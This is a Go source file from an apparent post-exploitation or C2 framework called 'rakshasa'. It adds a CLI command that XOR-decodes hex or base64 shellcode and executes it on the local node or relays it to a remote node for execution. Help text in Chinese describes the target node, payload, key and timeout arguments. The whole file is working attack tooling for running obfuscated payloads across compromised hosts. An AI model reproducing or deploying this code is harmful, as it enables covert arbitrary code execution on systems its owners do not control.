package server

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"rakshasa/common"
	"strconv"
	"time"

	"github.com/luyu6056/ishell"
)

type ShellCodeStruct struct {
	Str     string
	Key     string
	Param   string
	TimeOut int //second
}

func RunShellcodeWithDst(dst, shellcode, xorKey, param string, timeout int) error {

	if dst != "" {
		n, err := getNodeWithCurrentNode(dst)
		if err != nil {
			return fmt.Errorf("无法链接节点%s,错误%v", dst, err)
		}
		s := ShellCodeStruct{
			Str:     shellcode,
			Key:     xorKey,
			Param:   param,
			TimeOut: timeout,
		}
		if n.uuid == currentNode.uuid {
			return doShellcode(s)
		}
		res := make(chan interface{}, 1)
		id := n.storeQuery(res)

		b, _ := json.Marshal(s)
		n.Write(common.CMD_RUN_SHELLCODE, id, b)
		select {
		case v := <-res:
			fmt.Println("运行结果\n", v)
		case <-time.After(time.Second * time.Duration(timeout) * 2):
			fmt.Println("运行超时无结果")
		}
	} else {

		b, err := ioutil.ReadFile(shellcode)
		if err != nil {
			return currentNodeRunShellcode(shellcode, xorKey, param)
		} else {
			return currentNodeRunShellcode(string(b), xorKey, param)
		}

	}
	return nil
}
func currentNodeRunShellcode(shellcode, xorKey, param string) error {

	common.ChangeArg(param)
	b, err := hex.DecodeString(shellcode)

	if err != nil {
		b, err = base64.RawStdEncoding.DecodeString(shellcode)
	}
	if err != nil {
		b = []byte(shellcode)
		//fmt.Println(err)
		//return errors.New("shellcode hex/base64 解码失败")
	}

	if len(xorKey) > 0 {
		for i := 0; i < len(b); i++ {
			k := i % (len(xorKey))
			b[i] = b[i] ^ xorKey[k]
		}
	}

	shellcodeRun(b)
	return nil
}
func init() {
	shellcode := cliInit()
	shellcode.SetPrompt("rakshasa\\shellcode>")
	shellcode.AddCmd(&ishell.Cmd{
		Name: "run",

		Help: "运行shellcode，参数一为目标节点，参数二为shellcode代码或者本地文件，参数三为xor解密key,参数四为启动参数,参数五为等待时间（默认3秒）",
		Func: func(c *ishell.Context) {

			if len(c.Args) < 2 {
				c.Println("参数错误")
				return
			}
			xorKey := ""
			if len(c.Args) > 2 {
				xorKey = c.Args[2]
			}
			param := ""
			if len(c.Args) > 3 {
				param = c.Args[3]
			}
			b, err := ioutil.ReadFile(c.Args[0])
			if err != nil {
				b = []byte(c.Args[0])
			}
			timeout := 3
			if len(c.Args) > 4 {
				t, err := strconv.Atoi(c.Args[4])
				if err == nil {
					timeout = t
				}
			}
			err = RunShellcodeWithDst(string(b), c.Args[1], xorKey, param, timeout)
			if err != nil {
				c.Println(err)
			}
		},
	})

	rootCli.AddCmd(&ishell.Cmd{
		Name: "shellcode",
		Help: "执行shellcode",
		Func: func(c *ishell.Context) {
			shellcode.Run()
		},
	})

}
func doShellcode(s ShellCodeStruct) error {

	path, _ := os.Executable()
	_, exeName := filepath.Split(path)

	cmd := exec.Command("./"+exeName, "-shellcode", s.Str, "-sXor", s.Key, "-sParam", s.Param)
	reschan := make(chan string, 2)

	go func() {
		r, _ := cmd.CombinedOutput()

		reschan <- string(r)

	}()
	select {
	case res := <-reschan:
		return errors.New(res)
	case <-time.After(time.Second * (time.Duration(s.TimeOut))):
		return errors.New("已执行，等待超时")
	}

}
